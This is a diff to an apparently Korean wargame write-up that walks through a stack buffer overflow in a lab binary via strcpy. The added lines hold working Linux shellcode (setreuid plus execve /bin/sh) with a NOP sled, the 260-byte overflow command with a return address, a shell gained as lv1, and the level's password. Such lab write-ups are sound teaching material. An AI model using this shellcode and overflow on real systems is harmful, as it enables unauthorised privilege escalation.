@@ -36,9 +36,33 @@ Dump of assembler code for function main:
    0x08048483 <+83>:	ret   
 ```   
 0x0804845f <+47>:	lea    eax,[ebp-0x100]   
-이 부분을 보면 strcpy로 256바이트만큼의 문자열을 담을 수 있다.
-즉 ret부분까지 덮기위해서는 8바이트가 더 필요하므로 260바이트 만큼 쓰레기 값을 담아주고 나머지 4바이트에 원하는 주소값을 넣어준다.
+이 부분을 보면 strcpy로 256바이트만큼의 문자열을 담을 수 있다.  
 
+즉 ret부분까지 덮기위해서는 8바이트가 더 필요하다.  
+따라서 260바이트 만큼 쓰레기 값을 담아주고 나머지 4바이트에 원하는 주소값을 넣어준다.   
+
+```
+`export SHELLCODE=`perl -e 'print "\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+```   
+또한 공격을 위한 쉘코드는 위처럼 export로 환경변수를 만들고 그 안에다가 nop값과 함께 넣어준다.   
+그리고 gdb에서 x/2000x $esp를 통해 알아낸 nop부분의 적당한 주소값을 ret에 넣어준다.   
+이렇게 해주면 main이 끝나고 ret을 통해 nop주소로 이동을하며 쉘코드를 실행시키게 된다.
+
+필자가 ret에 넣어줄 주소값은 ```0xffffda7c```이다.
+
+실행결과   
+```
+./lv1 `perl -e 'print "a"x260, "\x7c\xda\xff\xff"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|���
+$ whoami
+lv1
+$ id
+uid=1001(lv1) gid=1000(lv0) groups=1000(lv0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+```
+
+성공적으로 권한을 얻은것을 확인할 수 있다.
+
+알아낸 lv1 비번 : hello newbie!
 
 ## lv 1
 
